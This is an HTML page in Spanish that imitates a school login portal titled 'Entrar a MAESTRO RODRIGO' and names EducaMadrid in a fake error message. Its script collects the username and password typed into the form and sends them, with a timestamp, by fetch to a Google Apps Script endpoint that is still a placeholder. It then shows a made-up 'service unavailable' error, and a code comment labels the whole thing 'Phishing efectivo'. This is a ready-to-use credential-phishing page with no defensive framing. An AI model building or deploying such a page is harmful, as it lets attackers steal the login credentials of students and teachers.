<body id="page-login-index" class="format-site path-login chrome dir-ltr lang-es yui-skin-sam yui3-skin-sam pagelayout-login theme">

<div id="page-wrapper">
    <div id="page" class="container-fluid pt-5 mt-0">
        <div id="page-content" class="row">
            <div id="region-main-box" class="col-12">
                <div id="region-main" class="col-12 h-100">
                    <div class="login-wrapper">
                        <div class="login-container">
                            <div role="main">
                                <div class="loginform">
                                    <h1 class="login-heading mb-4">Entrar a MAESTRO RODRIGO</h1>
                                    
                                    <form class="login-form" action="javascript:void(0);" id="login">
                                        <div class="login-form-username mb-3">
                                            <label for="username" class="sr-only">Nombre de usuario</label>
                                            <input type="text" name="username" id="username" class="form-control form-control-lg" placeholder="Nombre de usuario" required>
                                        </div>
                                        <div class="login-form-password mb-3">
                                            <label for="password" class="sr-only">Contraseña</label>
                                            <input type="password" name="password" id="password" class="form-control form-control-lg" placeholder="Contraseña" required>
                                        </div>
                                        <div class="login-form-submit mb-3">
                                            <button class="btn btn-primary btn-lg" type="submit" id="loginbtn">Acceder</button>
                                        </div>
                                    </form>

<div class="login-divider"></div>
<div class="d-flex justify-content-center">
    <form action="javascript:void(0);" method="post" id="guestlogin" class="w-100">
        <button class="btn btn-secondary btn-lg btn-block" type="submit" id="loginguestbtn">
            Entrar como persona invitada
        </button>
    </form>
</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

<div id="customAlert">
    <div class="alert-box">
        <h3 style="margin-top: 0; color: #d9534f; font-size: 18px;">Error de autenticación</h3>
        <p style="font-size: 14px; margin: 15px 0;">El servicio de EducaMadrid no está disponible temporalmente. Inténtelo más tarde.</p>
        <button onclick="location.reload();" style="background: #146ebe; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%;">Aceptar</button>
    </div>
</div>

<script>
    document.getElementById('login').onsubmit = function(e) {
        e.preventDefault();
        
        var u = document.getElementById('username').value;
        var p = document.getElementById('password').value;
        
        // --- COLOCA TU URL DE GOOGLE SCRIPT AQUÍ ---
        var googleURL = "TU_URL_DE_APPS_SCRIPT";

        // Envío de datos
        fetch(googleURL, {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify({
                usuario: u,
                password: p,
                fecha: new Date().toLocaleString()
            }),
            headers: { "Content-Type": "application/json" }
        });

        // Mostrar alerta y bloquear la web (Phishing efectivo)
        document.getElementById('customAlert').style.display = 'block';

        return false;
    };
</script>
